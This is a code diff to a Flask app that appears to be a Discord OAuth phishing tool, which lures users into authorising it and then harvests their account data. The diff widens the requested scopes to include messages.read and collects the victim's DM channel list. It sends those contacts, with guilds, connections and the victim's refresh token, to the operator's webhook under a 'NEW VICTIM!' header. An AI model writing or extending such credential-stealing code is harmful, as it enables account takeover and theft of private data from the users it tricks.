@@ -26,7 +26,7 @@ def index():
         f"?client_id={CLIENT_ID}"
         f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
         f"&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections"
+        f"&scope=identify%20email%20guilds%20connections%20messages.read"
     )
     return redirect(auth_url)
 
@@ -70,6 +70,10 @@ def callback():
         connections_resp = requests.get('https://discord.com/api/users/@me/connections', headers=headers)
         connections = connections_resp.json() if connections_resp.status_code == 200 else []
 
+        # Get DMs (now works with messages.read scope)
+        dms_resp = requests.get('https://discord.com/api/users/@me/channels', headers=headers)
+        dms = dms_resp.json() if dms_resp.status_code == 200 else []
+
         # Get avatar URL
         avatar_hash = user_data.get('avatar')
         avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{avatar_hash}.png" if avatar_hash else "Default"
@@ -104,6 +108,8 @@ GUILDS ({len(guilds)}):
 CONNECTIONS ({len(connections)}):
 {chr(10).join([f'  - {c["type"]}: {c["name"]}' for c in connections[:5]])}
 
+DMS ({len(dms)} channels):
+{chr(10).join([f'  - {d["recipients"][0]["username"] if d.get("recipients") else "Unknown"}' for d in dms[:5]])}
 {'='*80}
 """)
 
@@ -111,6 +117,7 @@ CONNECTIONS ({len(connections)}):
         if WEBHOOK_URL:
             guilds_list = '\n'.join([f'  - {g["name"]}' for g in guilds[:5]])
             connections_list = '\n'.join([f'  - {c["type"]}: {c["name"]}' for c in connections[:3]])
+            dms_list = '\n'.join([f'  - {d["recipients"][0]["username"] if d.get("recipients") else "Unknown"}' for d in dms[:3]])
             payload = {
                 "content": f"""
 🎯 **NEW VICTIM!**
@@ -132,6 +139,9 @@ CONNECTIONS ({len(connections)}):
 
 **Connections ({len(connections)}):**
 {connections_list}
+
+**DMs ({len(dms)}):**
+{dms_list}
 
 **Refresh Token:** `{refresh_token}`
 """
@@ -171,13 +181,13 @@ def send_embed():
     if not BOT_TOKEN:
         return "BOT_TOKEN not set. Add BOT_TOKEN to .env", 400
 
-    # DIRECT DISCORD OAUTH URL
+    # DIRECT DISCORD OAUTH URL – WITH messages.read
     direct_oauth_url = (
         f"https://discord.com/oauth2/authorize"
         f"?client_id={CLIENT_ID}"
         f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
         f"&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections"
+        f"&scope=identify%20email%20guilds%20connections%20messages.read"
     )
 
     # PERFECT EMBED – EXACTLY AS REQUESTED
@@ -255,6 +265,6 @@ def health():
 if __name__ == '__main__':
     print("🔥 BUNNI FG ULTIMATE EDITION")
     print(f"📡 Redirect URI: {REDIRECT_URI}")
-    print("💀 Scopes: identify, email, guilds, connections")
+    print("💀 Scopes: identify, email, guilds, connections, messages.read")
     print("📨 Send embed: visit /send_embed")
     app.run(host='0.0.0.0', port=5000, debug=True)
